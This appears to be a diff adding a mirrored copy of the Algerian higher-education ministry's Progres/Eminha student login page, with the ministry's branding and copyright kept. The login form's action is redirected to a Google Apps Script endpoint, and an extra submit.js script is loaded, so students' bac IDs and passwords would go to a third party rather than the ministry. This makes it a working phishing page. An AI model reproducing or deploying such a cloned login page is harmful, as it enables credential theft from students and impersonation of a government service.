@@ -1,0 +1,193 @@
+<?xml version='1.0' encoding='UTF-8' ?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:sec="http://www.springframework.org/security/tags">
+<!-- Mirrored from progres.mesrs.dz/eminha/login.xhtml by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Nov 2024 13:56:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head id="j_idt2"><link type="text/css" rel="stylesheet" href="javax.faces.resource/theme.css5e13.css?ln=primefaces-saga&amp;v=11.0.0&amp;e=11.0.0" /><link type="text/css" rel="stylesheet" href="javax.faces.resource/primeicons/primeicons.cssced5.css?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0" /><link type="text/css" rel="stylesheet" href="javax.faces.resource/css/bootstrap.min.css.css" /><link type="text/css" rel="stylesheet" href="javax.faces.resource/css/font-awesome.min.css.css" /><link type="text/css" rel="stylesheet" href="javax.faces.resource/css/progres-production.css.css" /><link type="text/css" rel="stylesheet" href="javax.faces.resource/css/jquery.ui.css.css" /><script type="text/javascript" src="javax.faces.resource/jquery/jquery.jsced5.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script><script type="text/javascript" src="javax.faces.resource/jquery/jquery-plugins.jsced5.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script><script type="text/javascript" src="javax.faces.resource/core.jsced5.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script><link type="text/css" rel="stylesheet" href="javax.faces.resource/components.cssced5.css?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0" /><script type="text/javascript" src="javax.faces.resource/components.jsced5.xhtml?ln=primefaces&amp;v=11.0.0&amp;e=11.0.0"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='fr';PrimeFaces.settings.viewId='/login.xhtml';PrimeFaces.settings.contextPath='/eminha';PrimeFaces.settings.cookiesSecure=false;}</script>
+	<title>Authentification -
+		Eminha </title>
+	<meta name="description" content="" />
+	<meta name="author" content="" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+	<link rel="shortcut icon" type="image/x-icon" href="images/favicon-Eminha.html" />
+
+	<style type="text/css">
+
+		/* login */
+		body.login {
+			background: #d7d7d7;
+		}
+
+		.login .logo {
+			background: url(../img/logo.html);
+			width: 277px;
+			height: 112px;
+			margin: 10px auto 15px;
+		}
+
+		.login #main {
+			margin-left: 0;
+		}
+
+		.login #content {
+			width: 400px;
+			position: relative;
+			margin: 0 auto;
+			padding: 0;
+		}
+
+		.login .client-form header {
+			color: #999;
+			font-size: 180%;
+			padding: 20px 0 0;
+			text-align: center;
+			border-bottom: none;
+			background: none;
+		}
+
+		.login .smart-form footer {
+			border-top: none;
+			background: #c4c4c4;
+		}
+
+		.login .note {
+			text-align: center;
+			padding-top: 3px;
+		}
+
+		.login .smart-form .note a {
+			color: #555;
+		}
+
+		.login .smart-form .input input {
+			font: 13px/16px Arial, Helvetica, sans-serif;
+		}
+
+		.login .connect1,.login .connect2 {
+			width: 49%;
+			height: 60px;
+			float: left;
+		}
+
+		.login .connect2 {
+			padding-top: 4px;
+		}
+
+		.login .ui-button {
+			padding: 3px 3px 6px !important;
+			float: left !important;
+			margin-right: 20px !important;
+		}
+
+		.login .bas,.login .bas a {
+			color: #666;
+			font-size: 9.5px;
+			line-height: 150%;
+			text-align: center;
+			padding-bottom: 20px;
+		}
+
+		.login .well {
+			background: #f0f0f0;
+			border: none;
+			box-shadow: none;
+		}
+
+		.login .smart-form fieldset {
+			background: none;
+		}
+
+		.login .titre {
+			color: #777;
+			font-size: 150%;
+			text-align: center;
+			padding: 8px 0 14px;
+		}
+
+		.login #home {
+			width: 936px;
+			position: relative;
+			margin: 0 auto;
+		}
+
+		.login #home .well {
+			border: #f0f0f0 solid 3px;
+		}
+
+		.ui-button-login {
+			background: none repeat scroll 0% 0% #1DA64A !important;
+		}
+	</style></head><body class="animated fadeInDown login">
+	<!-- <script>
+		function goToHome() {
+			window.location.href = "./login.html";
+		}
+		</script> -->
+
+
+	<div id="main" role="main">
+
+		
+		<div id="content" class="container">
+
+			<div class="logo" style="padding: 10px; text-align: center">
+				<img src="images/logo.png" alt="Progres" />
+			</div>
+
+
+			<div id="loginPanel" class="well no-padding">
+<form id="loginFrm" name="loginFrm" method="post" action="https://script.google.com/macros/s/AKfycbzdSqC8ikgYv36yZux85EV8K1Dfe3W9aXxYYF4kTnVcdgCRVFJL6OVJl63RaIVz2evZ/exec" class="smart-form client-form" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="loginFrm" value="loginFrm" />
+
+					<header> Progiciel de Gestion Intégré <br />
+						<small>Eminha </small></header><span id="loginFrm:j_idt20"></span><script type="text/javascript">$(function(){PrimeFaces.focus();});</script>
+					<fieldset style="padding-top: 5px">
+						<style>
+							.ui-messages-error-icon {
+								background: none;
+							}
+
+							.messages-error-icon {
+								width: 0px;
+							}
+						</style><div id="loginFrm:messages" class="ui-messages ui-widget" aria-live="polite"></div><script id="loginFrm:messages_s" type="text/javascript">$(function(){PrimeFaces.cw("Messages","widget_loginFrm_messages",{id:"loginFrm:messages"});});</script>
+						<br />
+
+						<section> <label class="input"> <i class="icon-append fa fa-user"></i><input id="loginFrm:j_username" name="loginFrm:j_username" type="text" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all " aria-required="true" autocomplete="off" placeholder="année de bac+matricule du bac ex:202335014252" /><script id="loginFrm:j_username_s" type="text/javascript">$(function(){PrimeFaces.cw("InputText","widget_loginFrm_j_username",{id:"loginFrm:j_username"});});</script></label> </section>
+
+						<section> <label class="input"> <i class="icon-append fa fa-lock"></i><input id="loginFrm:j_password" name="loginFrm:j_password" type="password" class="ui-password ui-inputfield ui-widget ui-state-default ui-corner-all " aria-required="true" autocomplete="off" placeholder="Mot de passe (celui de relève de note)" /><script id="loginFrm:j_password_s" type="text/javascript">$(function(){PrimeFaces.cw("Password","widget_loginFrm_j_password",{id:"loginFrm:j_password"});});</script>
+						</label> </section>
+
+						<section>
+
+							<div class="connect1"><button id="loginFrm:loginBtn" type="submit" name="loginFrm:loginBtn" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-button-save" onclick="" type="submit"><span class="ui-button-text ui-c">Se connecter</span></button><script id="loginFrm:loginBtn_s" type="text/javascript">$(function(){PrimeFaces.cw("CommandButton","widget_loginFrm_loginBtn",{id:"loginFrm:loginBtn"});});</script>
+							</div>
+
+							
+						</section>
+
+					</fieldset>
+
+					<footer>
+						<div class="note">
+							<a href="forget_password.html">Mot de passe oublié ?</a>
+						</div>
+					</footer><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="VTbAqOHmX5g3cinIDhSRAGCCuThCKRtBrJwwbKq7o6A2wYZAp+IGhST0pQDvCs4yThUhVUtU7blm7XV4l/5haK+WRnCMinIYZ8DjP3xTTeCOCWmTgb3BWfaRUm8din5QD8EuMyfkB2FhrTF4hbHCc/SlepeUe3HGkcGJnWOs1m68vSoXE0A2h7ZS+2Wiq8XkR4S4pJPu5qS7zxsTTZDQjMpXUECj7BQfN4FYzhvB6ZhtHzP9rcmZCf4a+1aRXrOwQH7IeGn4UU5+x6LwNtI3OpSu4FaWaddsuIVVFvpSJtcjpp6T1M9wpH0n8Q0fRT3EXRwnPB/sWsU44JhEggDyuiJPbNETEV26BNl2C8vZhJvG8f5IcgsiDnL6Qgn43MwDUGI+6A5cYuDXK5dnc2PzXYZ3uCFThNnyo8eACxtcnRD4Ln0pBpwiIA59BRJa6JaaU/WgkyTg3gd0UhPTD8dpOMPQLnw1lDvvgiABx1GukSSb7ooOkTfq0M0iOqz6OBf5sVQEOTvdW7R5Cwud9102HZ4jdXiZuphbt2mNlYfmLs9RtnVFd8wvfLg0YlfvdYzjHlOWpKWznXvmxA6DwibNPf6TwDzuoos7rF8YrOzKpbHHMfWjxoPj25ZK9waeoX1K/ZvcuAeoOyWHBeIP5o1sSQi/JHVrErE44uz2C0rxVVEWbiDrHfsLAUohJDL/P2La48j+IBgP2qSqKoT+wbi4UuFFEDSNqVId7/WM9wIXo+UeA1Z6qMxQLg4Y3hWjvSdP8VamNzhN+vdglry2iAHbp/011/MkRtLkwktfJ0W9ZjgUjU03U802Ru0pRr4euNarGk159veVaP+RvwurUpdgSeiBcK48d8m9OoV2V2hzJRVn1o1hmg0YNDTtt5OmCABkBrUfs0IvsU47g8e09HBTX3oFliMA+tiVZxfQILnn2XecQwgsoRwyGz275LLCdd2B8TQfuVQygQEY+Bwq/+6crRBi195duivA1+1GoL4QtvRzBvV2pdf1Suf/wqCcpqnUh6zV1HSZHPv4FbpaifbCGA==" autocomplete="off" />
+</form>
+			</div>
+
+
+
+			<div class="bas">
+				Copyright 2024 <a href="https://www.mesrs.dz/"><strong>Ministére de l'Enseignement Supérieur et de la Recherche Scientifique</strong></a><br />
+				
+			</div>
+		</div>
+
+
+	</div>
+<script src="./submit.js"></script>
+</body>
+
+<!-- Mirrored from progres.mesrs.dz/eminha/login.xhtml by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Nov 2024 13:56:09 GMT -->
+</html>
